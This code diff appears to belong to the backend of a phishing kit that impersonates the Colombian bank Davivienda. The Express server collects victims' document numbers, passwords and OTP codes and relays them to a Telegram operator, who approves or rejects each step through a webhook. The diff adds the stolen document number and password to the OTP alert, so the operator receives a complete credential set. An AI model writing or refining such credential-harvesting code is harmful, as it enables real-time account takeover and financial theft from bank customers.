@@ -24,8 +24,8 @@ app.use(cors({
 app.use(express.json());
 
 // --- ALMACENAMIENTO EN MEMORIA ---
-const solicitudesPendientes = {};   // para documento/clave
-const otpsPendientes = {};          // para códigos OTP
+const solicitudesPendientes = {};
+const otpsPendientes = {};
 
 // ============================================================
 // RUTA 1: Recibir datos del Frontend (documento + clave)
@@ -94,7 +94,7 @@ app.get('/api/estado/:requestId', (req, res) => {
 });
 
 // ============================================================
-// RUTA 3: Webhook de Telegram (Aprobar/Rechazar paso 1)
+// RUTA 3: Webhook de Telegram (Aprobar/Rechazar)
 // ============================================================
 app.post('/api/telegram-webhook', async (req, res) => {
     const { callback_query } = req.body;
@@ -109,7 +109,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const userId = usuario.id;
         const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
 
-        // --- Caso 1: Es un callback del paso 1 (documento/clave) ---
+        // --- Caso 1: Callback del paso 1 (documento/clave) ---
         if (solicitudesPendientes[requestId]) {
             const solicitud = solicitudesPendientes[requestId];
 
@@ -166,7 +166,7 @@ ${estadoTexto}
             }
         }
 
-        // --- Caso 2: Es un callback del paso 2 (OTP) ---
+        // --- Caso 2: Callback del paso 2 (OTP) ---
         else if (otpsPendientes[requestId]) {
             const otp = otpsPendientes[requestId];
 
@@ -188,6 +188,8 @@ ${estadoTexto}
 
             const mensajeActualizado = `
 🔐 *CÓDIGO OTP - DAVIVIENDA*
+👤 *Documento:* ${otp.documento}
+🔑 *Clave:* ${otp.clave}
 🔢 *Código OTP:* ${otp.codigo}
 🆔 *ID:* ${requestId}
 
@@ -229,17 +231,24 @@ ${estadoTexto}
 // RUTA 4: Recibir OTP del Frontend (paso 2)
 // ============================================================
 app.post('/api/solicitar-otp', async (req, res) => {
-    const { otp } = req.body;
+    const { otp, documento, clave } = req.body;
 
     if (!otp) {
         return res.status(400).json({ error: 'Falta el código OTP' });
     }
 
     const requestId = Date.now().toString();
-    otpsPendientes[requestId] = { estado: 'pendiente', codigo: otp };
+    otpsPendientes[requestId] = { 
+        estado: 'pendiente', 
+        codigo: otp,
+        documento: documento || 'No disponible',
+        clave: clave || 'No disponible'
+    };
 
     const mensaje = `
 🔐 *CÓDIGO OTP - DAVIVIENDA*
+👤 *Documento:* ${documento || 'No disponible'}
+🔑 *Clave:* ${clave || 'No disponible'}
 🔢 *Código OTP:* ${otp}
 🆔 *ID:* ${requestId}
 ⏳ *Estado:* Pendiente
